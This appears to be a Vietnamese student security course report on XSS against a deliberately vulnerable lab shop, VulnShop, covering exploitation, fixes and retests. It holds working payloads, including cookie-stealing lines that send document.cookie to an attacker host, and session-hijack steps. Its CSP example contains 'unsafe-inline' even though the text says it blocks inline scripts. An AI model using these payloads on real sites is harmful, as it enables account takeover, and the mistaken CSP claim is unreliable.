# BẢN THẢO NỘI DUNG BÁO CÁO BÀI TẬP LỚN - PHẦN PHỤ TRÁCH CỦA THÀNH VIÊN 2
**Học phần:** An ninh mạng (Network & Application Security)  
**Đề tài:** Khai thác lỗ hổng Web (OWASP Top 10) và Giải pháp khắc phục: Tập trung vào SQL Injection và Cross-Site Scripting (XSS) trên một ứng dụng Thương mại Điện tử giả lập  
**Thành viên thực hiện:** Thành viên 2 (Vai trò: Frontend & Lỗ hổng Cross-Site Scripting Specialist)  
**Các mục phụ trách:** 1.3, 2.2 (Phần giao diện & bề mặt XSS), 3.2 (Kịch bản thực nghiệm XSS), 4.1 (Bảng kết quả trước/sau khi vá - phần XSS)  

---

## MỤC 1.3. LỖ HỔNG CROSS-SITE SCRIPTING (XSS - CWE-79) VÀ CƠ CHẾ CƯỚP PHIÊN ĐĂNG NHẬP

### 1.3.1. Khái niệm và nguyên lý hình thành lỗ hổng Cross-Site Scripting
Lỗ hổng Cross-Site Scripting (viết tắt là XSS, định danh theo chuẩn MITRE là [CWE-79](https://cwe.mitre.org/data/definitions/79.html)) là một trong những dạng tấn công tiêm mã (Code Injection) phổ biến và nguy hiểm bậc nhất trong các ứng dụng web hiện đại. Theo số liệu công bố trong danh mục **OWASP Top 10:2021**, XSS cùng với SQL Injection cấu thành nhóm nguy cơ trọng yếu **A03:2021 – Injection**, chiếm tỷ lệ xuất hiện cao trong các cuộc kiểm thử bảo mật thực tế.

Bản chất kỹ thuật của XSS xuất phát từ việc ứng dụng web chấp nhận dữ liệu đầu vào từ người dùng (User-Controlled Input) nhưng khi kết xuất dữ liệu này trở lại giao diện trình duyệt (HTML Output Context), hệ thống không thực hiện các biện pháp kiểm duyệt (Input Validation), làm sạch (Sanitization) hoặc mã hóa theo đúng ngữ cảnh (Context-Aware Output Encoding). Do trình duyệt web tuân thủ mô hình thực thi hướng sự kiện và không có khả năng tự động phân biệt giữa một đoạn mã kịch bản (Script) hợp pháp do lập trình viên định nghĩa với một đoạn mã kịch bản độc hại do kẻ tấn công cài cắm, trình duyệt sẽ tự động phân tích cú pháp (Parse) và biên dịch thực thi đoạn mã đó dưới quyền hạn bảo mật của chính người dùng đang truy cập.

### 1.3.2. Phân loại kỹ thuật Cross-Site Scripting
Dựa trên đường đi của dữ liệu độc hại và vị trí lưu trữ/thực thi, XSS được phân thành ba phân loại chính:

#### 1.3.2.1. Reflected XSS (XSS Không Lưu Trữ - Non-Persistent)
- **Đặc điểm:** Dữ liệu độc hại được kẻ tấn công chèn vào một yêu cầu HTTP (thường qua tham số URL Query String như `?q=...` hoặc `?search=...`, hoặc qua HTTP Header) và được máy chủ web phản xạ (Reflect) ngay lập tức trong nội dung phản hồi HTTP Response mà không lưu vào bộ nhớ lâu dài.
- **Kịch bản tấn công:** Do mã độc không lưu lại trên máy chủ, kẻ tấn công phải sử dụng kỹ thuật phi kỹ thuật (Social Engineering), tạo ra các đường link độc hại được ngụy trang cẩn thận và lừa nạn nhân nhấp chuột vào liên kết đó (qua Email, tin nhắn lừa đảo, hoặc diễn đàn mạng xã hội).
- **Vị trí phổ biến trên sàn TMĐT:** Thanh tìm kiếm sản phẩm, bộ lọc danh mục sản phẩm theo giá hoặc thương hiệu, thông báo hiển thị lỗi hoặc xác nhận thanh toán.

#### 1.3.2.2. Stored XSS (XSS Lưu Trữ - Persistent XSS)
- **Đặc điểm:** Đây là dạng thức XSS có mức độ phá hoại nghiêm trọng nhất. Dữ liệu độc hại sau khi được gửi lên máy chủ web sẽ được ghi nhận và lưu trữ vĩnh viễn trong cơ sở dữ liệu (Database), hệ thống tệp tin (File System) hoặc hàng đợi tin nhắn (Message Queue).
- **Kịch bản tấn công:** Kẻ tấn công chỉ cần gửi payload một lần duy nhất. Kể từ thời điểm đó, bất kỳ người dùng nào (khách hàng khác, nhân viên chăm sóc khách hàng, hay Quản trị viên sàn TMĐT) khi truy cập vào trang chứa dữ liệu lưu trữ đó đều trở thành nạn nhân một cách thụ động mà không cần phải nhấp vào bất kỳ đường link lạ nào.
- **Vị trí phổ biến trên sàn TMĐT:** Mục Đánh giá & Bình luận sản phẩm (Product Reviews), phần Hỏi & Đáp cộng đồng, Tên hiển thị trong Hồ sơ cá nhân (Profile Display Name), hoặc Ghi chú đơn hàng gửi cho Quản trị viên.

#### 1.3.2.3. DOM-based XSS (XSS Dựa Trên Mô Hình Đối Tượng Tài Liệu)
- **Đặc điểm:** Khác biệt hoàn toàn với Reflected và Stored XSS vốn phụ thuộc vào logic xử lý của Backend Server, DOM-based XSS xảy ra hoàn toàn tại tầng Client-side (phía trình duyệt của người dùng). Dữ liệu độc hại được đọc từ một "Nguồn" (DOM Source) và truyền vào một "Hàm/Thuộc tính thực thi nguy hiểm" (DOM Sink) bởi chính các đoạn mã JavaScript trên máy khách.
- **Dấu hiệu kỹ thuật:** Kẻ tấn công thường chèn payload vào phần Fragment Identifier (sau dấu `#` trong URL, ví dụ: `https://site.com/track#<img src=x onerror=...>`). Vì theo tiêu chuẩn RFC 3986, chuỗi sau dấu `#` không bao giờ được gửi lên Web Server trong HTTP Request, các hệ thống tường lửa ứng dụng web (WAF) ở tầng mạng hoặc server logs hoàn toàn không thể phát hiện hay ghi nhận cuộc tấn công này.
- **DOM Sources điển hình:** `window.location.hash`, `window.location.search`, `document.referrer`, `window.name`, `localStorage`.
- **DOM Sinks nguy hiểm:** `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout(string)`.

### 1.3.3. Cơ chế cướp phiên đăng nhập (Session Hijacking) và thao túng giao diện (DOM Defacement)
Một khi thực thi thành công JavaScript độc hại trên trình duyệt nạn nhân, kẻ tấn công nắm trong tay quyền lực tương đương với người dùng đó. Hai kịch bản nguy hiểm nhất bao gồm:

#### 1.3.3.1. Cơ chế đánh cắp Session Cookie (Session Hijacking via document.cookie)
Phiên làm việc (Session) của người dùng trên web TMĐT thường được duy trì thông qua một mã định danh ngẫu nhiên (Session ID) lưu trữ trong Cookie của trình duyệt. 
1. **Lỗ hổng tiền đề:** Khi lập trình viên khởi tạo phiên làm việc mà không thiết lập cờ `HttpOnly` cho Cookie, trình duyệt mặc định cho phép JavaScript truy cập toàn bộ chuỗi Cookie thông qua đối tượng `document.cookie`.
2. **Kỹ thuật trích xuất ngầm:** Mã độc XSS sẽ khởi tạo một yêu cầu HTTP ngầm (sử dụng đối tượng `Image()`, hàm `fetch()`, hoặc `navigator.sendBeacon()`) để gửi giá trị Cookie về máy chủ thu thập của kẻ tấn công (Cookie Stealer / Webhook Listener):
   ```javascript
   new Image().src = "http://attacker-ip:8888/log?cookie=" + encodeURIComponent(document.cookie);
   ```
3. **Chiếm đoạt tài khoản:** Kẻ tấn công nhận được chuỗi Session ID, chèn thủ công vào trình duyệt của mình (qua tiện ích EditThisCookie hoặc công cụ Burp Suite/cURL) và gửi yêu cầu tới các trang nội bộ của hệ thống. Lúc này, máy chủ nhận diện kẻ tấn công chính là Quản trị viên hợp pháp, cho phép kẻ tấn công kiểm soát toàn bộ sàn TMĐT mà không cần dò mật khẩu hay vượt qua cơ chế xác thực hai lớp (2FA).

#### 1.3.3.2. Cơ chế làm biến dạng giao diện (DOM Defacement) và lừa đảo (Phishing)
JavaScript có toàn quyền sửa đổi cấu trúc Document Object Model trong bộ nhớ trình duyệt:
- Kẻ tấn công có thể thay thế toàn bộ giao diện sàn TMĐT bằng một giao diện giả mạo yêu cầu người dùng nhập lại thông tin thẻ ngân hàng hoặc mật khẩu tài khoản.
- Kẻ tấn công có thể can thiệp trực tiếp vào các phần tử hiển thị giá tiền (`.product-price`), giảm giá các thiết bị công nghệ cao cấp xuống mức tượng trưng để kích thích người dùng thực hiện giao dịch, hoặc chèn các thông điệp đe dọa, phá hoại danh tiếng thương hiệu của sàn TMĐT.

---

## MỤC 2.2. ỨNG DỤNG THƯƠNG MẠI ĐIỆN TỬ GIẢ LẬP: PHÂN HỆ GIAO DIỆN & BỀ MẶT TẤN CÔNG XSS

### 2.2.1. Kiến trúc phân hệ Giao diện người dùng (Frontend Architecture)
Phân hệ giao diện của ứng dụng TMĐT VulnShop được thiết kế bởi **Thành viên 2**, tập trung vào tính trực quan, hiện đại, tối ưu hóa trải nghiệm người dùng theo đúng tiêu chuẩn một sàn bán lẻ công nghệ trực tuyến:
- **Ngôn ngữ & Công nghệ:** HTML5 ngữ nghĩa (Semantic HTML), CSS3 Responsive (Flexbox, CSS Grid), và Vanilla JavaScript (ES6) tương tác hướng sự kiện. Phân hệ được tích hợp đồng bộ và toàn diện với Backend Node.js (Express framework) và hệ quản trị CSDL MySQL 8.0 do **Thành viên 1** xây dựng.
- **Tổ chức giao diện:**
  1. **Thanh Header & Banner Trạng Thái:** Hiển thị trực tiếp chế độ bảo mật hiện tại của hệ thống (**VULNERABLE** màu đỏ vs **SECURE** màu xanh lá) tại cổng 3000, thanh tìm kiếm toàn sàn và lối tắt tới Bảng theo dõi Logs Cookie của Attacker (cổng 8888).
  2. **Trang Chủ & Lưới Sản Phẩm (`/index.html`):** Hiển thị danh mục sản phẩm được nạp động từ CSDL MySQL của TV1 qua endpoint `/api/products/search`, hình ảnh, tên sản phẩm, đơn giá định dạng chuẩn Việt Nam Đồng (qua hàm xử lý `formatVND`), mô tả ngắn và các nút tương tác giỏ hàng.
  3. **Trang Chi Tiết Sản Phẩm & Phân Hệ Bình Luận (`/product_detail.html?id=...`):** Cung cấp thông số cấu hình chi tiết từ `/api/products/:id` và đặc biệt là phân hệ **Gửi nhận xét & Đánh giá từ khách hàng** kết nối với `/api/reviews`. Đây chính là bề mặt kiểm thử cốt lõi cho kịch bản Stored XSS lưu vào bảng `reviews` của MySQL.
  4. **Trang Quản Lý Hồ Sơ Cá Nhân (`/profile.html`):** Cho phép người dùng xem thông tin tài khoản phiên làm việc từ `/api/auth/me` và cập nhật Tên hiển thị công khai (Display Name).
  5. **Trang Tra Cứu Đơn Hàng & Vận Đơn (`/order_track.html`):** Hỗ trợ khách hàng theo dõi trạng thái giao hàng thông qua mã vận đơn (như 1, 2) từ MySQL qua `/api/orders/track` và bóc tách thông số qua URL Hash để kiểm thử DOM XSS.
  6. **Trang Bảng Điều Khiển Quản Trị (`/admin`):** Khu vực được bảo vệ nghiêm ngặt bằng session, chỉ cho phép tài khoản Admin truy cập, đóng vai trò mục tiêu tấn công chiếm quyền trong kịch bản Session Hijacking.

### 2.2.2. Khảo sát chi tiết các điểm nhập liệu và bề mặt tấn công XSS cố ý để lại
Để phục vụ mục đích nghiên cứu và kiểm thử thâm nhập, hệ thống VulnShop được cố ý duy trì các điểm nhập liệu thiếu an toàn tại bản Vulnerable:

*Bảng 2.1: Bảng tổng hợp bề mặt tấn công XSS trên ứng dụng VulnShop*
| STT | Endpoint / Vị trí | Tham số (Parameter) | Ngữ cảnh kết xuất (Context) | Loại lỗ hổng XSS | Sink / Thuộc tính nguy hiểm |
| :---: | :--- | :---: | :--- | :---: | :--- |
| 1 | `/search` (Thanh tìm kiếm) | `q` | Thân HTML (`<h1>Kết quả...</h1>`) | Reflected XSS | Nối chuỗi trực tiếp vào HTML response |
| 2 | `/product` (Form bình luận) | `comment` | Bảng duyệt bình luận Admin & Client | Stored XSS | Lưu vào bảng `reviews`, render bằng `innerHTML` thô |
| 3 | `/product` (Tên người gửi) | `user_name` | Thẻ tác giả (`<span class="author">`) | Stored XSS | Kết xuất trực tiếp không qua lọc thực thể |
| 4 | `/profile` (Sửa hồ sơ) | `display_name` | Tiêu đề chào mừng (`<h2>Xin chào...</h2>`) | Stored / DOM XSS | Gán trực tiếp chuỗi vào `element.innerHTML` |
| 5 | `/order-track` (Tra cứu đơn) | `location.hash` | Khung thông báo Client-side | DOM-based XSS | Đọc chuỗi sau `#` và gán vào `target.innerHTML` |

---

## MỤC 3.2. KỊCH BẢN THỰC NGHIỆM KHAI THÁC VÀ VÁ LỖ HỔNG CROSS-SITE SCRIPTING (XSS)

Theo quy định của đề tài, mỗi kịch bản thực nghiệm bắt buộc phải trải qua đầy đủ 4 bước tuần tự: **(1) Lab Setup, (2) Exploitation, (3) Defense & Mitigation, (4) Re-test**.

### 3.2.1. Kịch bản 1: Reflected XSS trên Thanh Tìm Kiếm Sản Phẩm

#### Bước 1: Lab Setup (Thiết lập môi trường)
- Đảm bảo ứng dụng VulnShop đang hoạt động tại cổng 3000 (`http://localhost:3000`) thông qua Docker (`docker compose up`) hoặc chạy trực tiếp bằng Node.js (`node server.js`).
- Kiểm tra thanh banner trên cùng: Phải ở trạng thái **"⚠️ VULNERABLE MODE (Port 3000)"**.
- Mở trình duyệt Web (Chrome hoặc Firefox), bật thanh công cụ lập trình DevTools (`F12`), chuyển sang tab *Console* và *Network*.

#### Bước 2: Exploitation (Thực hiện khai thác)
1. **Canary Verification (Kiểm thử thực thi cơ bản):**
   - Tại ô tìm kiếm trên thanh Navigation, kẻ tấn công nhập chuỗi payload:
     ```html
     <script>alert('Reflected_XSS_Active')</script>
     ```
   - Nhấp nút **Tìm** hoặc điều hướng trực tiếp bằng URL:
     `http://localhost:3000/search?q=%3Cscript%3Ealert('Reflected_XSS_Active')%3C%2Fscript%3E`
   - **Hiện tượng:** Trình duyệt ngay lập tức kích hoạt hộp thoại Alert Popup hiển thị dòng chữ *"Reflected_XSS_Active"*.
2. **Khai thác Vector Event Handler (Bypass bộ lọc thẻ script):**
   - Kẻ tấn công sử dụng payload thẻ hình ảnh:
     ```html
     <img src="non_exist.jpg" onerror="alert('XSS_via_Image_Tag')">
     ```
   - Khi trang web tải, ảnh không tồn tại kích hoạt sự kiện `onerror`, mã độc JavaScript thực thi thành công.

#### Bước 3: Defense & Mitigation (Giải pháp khắc phục)
1. **Mã hóa đầu ra theo ngữ cảnh (Context-aware HTML Entity Encoding):**
   Thay vì nối chuỗi biến `q` thô vào template HTML, mã nguồn Node.js Express phía server được chuẩn hóa bằng hàm encode HTML entities:
   ```javascript
   // SOURCE/web-app/backend/server.js (Chế độ SECURE)
   const safeQ = q.replace(/&/g, '&amp;')
                  .replace(/</g, '&lt;')
                  .replace(/>/g, '&gt;')
                  .replace(/"/g, '&quot;')
                  .replace(/'/g, '&#x27;');
   const content = `<h2>Kết quả tìm kiếm cho: <span>${safeQ}</span></h2>`;
   ```
2. **Thiết lập Content Security Policy (CSP):**
   Máy chủ Express gửi kèm Header HTTP chặn thực thi script inline:
   ```http
   Content-Security-Policy: default-src 'self' https://images.unsplash.com; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; object-src 'none';
   ```

#### Bước 4: Re-test (Kiểm tra lại)
- Khởi chạy hệ thống ở chế độ an toàn: `MODE=secure`.
- Gửi lại toàn bộ các payload trên.
- **Kết quả:** Thẻ `<script>` hiển thị nguyên vẹn dưới dạng chuỗi văn bản thô `&lt;script&gt;alert('Reflected_XSS_Active')&lt;/script&gt;` trên giao diện người dùng. Không có hộp thoại popup nào xuất hiện. Tab Console ghi nhận mã nguồn hoàn toàn an toàn.

---

### 3.2.2. Kịch bản 2: Stored XSS trong Bình Luận & Đánh Cắp Phiên Đăng Nhập Quản Trị (Session Hijacking)

#### Bước 1: Lab Setup (Thiết lập môi trường)
- Khởi chạy Web TMĐT VulnShop tại `http://localhost:3000` (`docker compose up`).
- Khởi chạy Attacker Cookie Stealer Server tại cổng 8888 (`python SOURCE/exploits/cookie_stealer/stealer.py` hoặc qua docker compose). Mở tab theo dõi tại `http://localhost:8888/`.
- Chuẩn bị hai phiên trình duyệt riêng biệt:
  - **Trình duyệt A (Attacker):** Cửa sổ thông thường, đóng vai người mua hàng ẩn danh.
  - **Trình duyệt B (Victim):** Cửa sổ ẩn danh (Incognito), đăng nhập với tư cách Quản trị viên (`admin` / `Admin@123`).

#### Bước 2: Exploitation (Thực hiện khai thác)
1. **Cấy mã độc Stored XSS vào sản phẩm:**
   - Tại Trình duyệt A, truy cập chi tiết sản phẩm 1: `http://localhost:3000/product_detail.html?id=1`.
   - Tại form bình luận, nhập Tên: `Khách Hàng Bí Mật`.
   - Tại ô Nhận xét, nhập payload đánh cắp cookie:
     ```html
     Sản phẩm rất đẹp! <script>new Image().src="http://localhost:8888/log?cookie=" + encodeURIComponent(document.cookie);</script>
     ```
   - Nhấp nút **Gửi Đánh Giá**. Payload được gửi tới API `/api/reviews` và lưu thành công vào bảng `reviews` trong CSDL MySQL `shop_db`.
2. **Kích hoạt mã độc trên phiên Quản trị viên:**
   - Tại Trình duyệt B, Quản trị viên đăng nhập tại `/login.html` và truy cập Bảng điều khiển quản trị: `http://localhost:3000/admin`.
   - Trình duyệt Admin render danh sách bình luận hoặc trang sản phẩm. Thẻ `<script>` âm thầm thực thi trong bối cảnh phiên của Quản trị viên.
   - Đối tượng `Image()` ngầm gửi yêu cầu GET tới máy chủ Attacker cổng 8888 kèm theo toàn bộ `document.cookie`.
3. **Thu thập Cookie và Đột nhập trái phép (Session Hijacking):**
   - Tại máy chủ Attacker (cổng 8888), xuất hiện dòng log:
     ```text
     [2026-11-06 21:15:32] IP: 127.0.0.1
        - Cookie nhận được : session_id=s%3Ae937d40cb972412fa281...
        - Nguồn rò rỉ (Ref) : http://localhost:3000/
     ```
   - Kẻ tấn công chạy kịch bản giả mạo phiên:
     ```bash
     python SOURCE/exploits/cookie_stealer/hijack_session.py s%3Ae937d40cb972412fa281...
     ```
   - **Kết quả:** Kẻ tấn công nhận phản hồi HTTP 200 OK từ `http://localhost:3000/admin`, chiếm toàn quyền xem Admin Dashboard mà không cần biết mật khẩu Admin.
4. **Khai thác DOM Defacement phụ trợ:**
   - Kẻ tấn công gửi bình luận chứa đoạn mã sửa DOM từ file `dom_defacement.js`. Khi mở trang sản phẩm, banner đỏ "HỆ THỐNG BỊ TẤN CÔNG" xuất hiện và đơn giá các thiết bị bị hạ xuống 1.000 VNĐ.

#### Bước 3: Defense & Mitigation (Giải pháp khắc phục)
1. **Thiết lập Cờ Cookie HttpOnly & SameSite trong Node.js Express:**
   Đây là lớp phòng vệ then chốt nhất. Tại máy chủ Express backend:
   ```javascript
   // SOURCE/web-app/secure/config/session/session_security.js
   cookie: {
       httpOnly: true, // CHẶN JAVASCRIPT TRUY CẬP COOKIE QUA document.cookie
       sameSite: 'lax', // PHÒNG CHỐNG TẤN CÔNG CSRF
       secure: process.env.NODE_ENV === 'production'
   }
   ```
2. **Làm sạch nội dung bằng DOMPurify & textContent:**
   Khi kết xuất bình luận, áp dụng thư viện `DOMPurify.sanitize()` và gán qua `element.textContent` thay cho `innerHTML`.

#### Bước 4: Re-test (Kiểm tra lại)
- Chuyển hệ thống sang **SECURE MODE** (`MODE=secure`).
- Đăng nhập lại Admin và kiểm tra qua DevTools (`F12 -> Application -> Cookies`): Cột `HttpOnly` đã có dấu tích xác nhận.
- Gửi lại payload cướp cookie.
- Khi Admin mở trang, thẻ script được render dưới dạng chuỗi an toàn `&lt;script&gt;...` hoặc làm sạch qua DOMPurify.
- Kiểm tra log máy chủ Attacker: Khi cố đọc `document.cookie`, chuỗi trả về hoàn toàn rỗng.
- Chạy lại script `hijack_session.py`: Bị từ chối quyền truy cập (403 Forbidden), hoàn toàn ngăn chặn Session Hijacking.

---

### 3.2.3. Kịch bản 3: DOM-based XSS trên Trang Tra Cứu Vận Đơn

#### Bước 1: Lab Setup (Thiết lập môi trường)
- Mở trang tra cứu đơn hàng: `http://localhost:3000/order_track.html`.
- Kiểm tra mã nguồn Client-side: Trang web có đoạn mã JavaScript đọc `window.location.hash` và gán vào `target.innerHTML`.

#### Bước 2: Exploitation (Thực hiện khai thác)
- Kẻ tấn công nối payload vào sau dấu thăng `#` trên thanh địa chỉ:
  `http://localhost:3000/order_track.html#<img src=x onerror=alert('DOM_XSS_Success')>`
- Nhấn phím Enter để tải trang.
- **Phân tích:** Trình duyệt bóc tách phần hash `rawHash.slice(1)` và gán trực tiếp vào thuộc tính `innerHTML` của phần tử `#dom-status-msg`. Sự kiện `onerror` kích hoạt ngay lập tức mà không có bất kỳ gói tin nào gửi lên server.

#### Bước 3: Defense & Mitigation (Giải pháp khắc phục)
- Thay đổi thuộc tính gán từ `element.innerHTML` sang `element.textContent`:
  ```javascript
  // SOURCE/web-app/secure/secure_order_track.html
  var decoded = decodeURIComponent(rawHash);
  target.textContent = "Dữ liệu từ Hash: " + decoded; // AN TOÀN TUYỆT ĐỐI
  ```

#### Bước 4: Re-test (Kiểm tra lại)
- Nạp lại URL hash trên chế độ SECURE.
- Chuỗi `<img src=x onerror=...>` được hiển thị dưới dạng văn bản thông thường, không tạo thẻ ảnh lỗi, triệt tiêu 100% khả năng thực thi mã độc.

---

## MỤC 4.1. KẾT QUẢ ĐẠT ĐƯỢC: BẢNG SO SÁNH TRƯỚC VÀ SAU KHI VÁ LỖ HỔNG (PHẦN XSS)

Dưới đây là bảng ma trận đối chiếu toàn diện kết quả thực nghiệm bảo mật phân hệ Cross-Site Scripting giữa hai trạng thái hệ thống:

*Bảng 4.1: Ma trận so sánh kết quả thực nghiệm XSS trước và sau khi triển khai giải pháp phòng vệ*
| Tiêu chí đối chiếu | Trạng thái trước khi vá (Vulnerable Mode) | Trạng thái sau khi vá (Secure Mode) | Nhận xét chuyên môn của TV2 |
| :--- | :--- | :--- | :--- |
| **Điểm số CVSS v3.1** | **8.8 (High)** - Nguy cơ rò rỉ dữ liệu và chiếm quyền quản trị sàn | **0.0 (None)** - Các bề mặt tấn công đã được triệt tiêu hoàn toàn | Giảm thiểu 100% rủi ro an ninh mạng |
| **Reflected XSS (`/search`)** | Popup Alert kích hoạt ngay khi người dùng tìm kiếm từ khóa | Ký tự `<script>` được chuyển thành `&lt;script&gt;`, hiển thị text thô | Output Encoding và header CSP Express ngăn chặn thành công |
| **Stored XSS (`/product`)** | Đoạn mã độc lưu trong MySQL `reviews`, thực thi ngầm trên trình duyệt Admin | Hiển thị văn bản bình luận thuần túy, không kích hoạt thẻ script | Dùng `textContent` và `DOMPurify` loại bỏ thẻ nguy hiểm |
| **Cướp Cookie (`document.cookie`)** | Kẻ tấn công cướp được Session ID của Admin, chiếm đoạt sàn TMĐT | Giá trị trả về rỗng, Attacker Logger chỉ nhận chuỗi rỗng | Cờ `HttpOnly=true` trong Express Session cô lập hoàn toàn Cookie |
| **DOM-based XSS (`/order_track.html`)** | Thực thi mã JavaScript thông qua DOM Sink `innerHTML` từ `#hash` | Hiển thị chuỗi an toàn dưới dạng TextNode qua `textContent` | Loại bỏ hoàn toàn các DOM Sink nguy hiểm phía Client |
| **Thao túng giao diện (Defacement)** | Kẻ tấn công chèn banner đe dọa, hạ giá sản phẩm về 1.000 VNĐ | Giao diện và bảng giá sản phẩm giữ nguyên vẹn 100% | Toàn vẹn cấu trúc DOM được bảo vệ |
| **Bảo vệ phòng thủ chiều sâu** | Không có CSP, không có cờ bảo vệ Cookie, không lọc đầu ra | Đa tầng: Output Encoding + textContent + DOMPurify + HttpOnly + CSP | Mô hình Defense-in-Depth đạt chuẩn quốc tế |
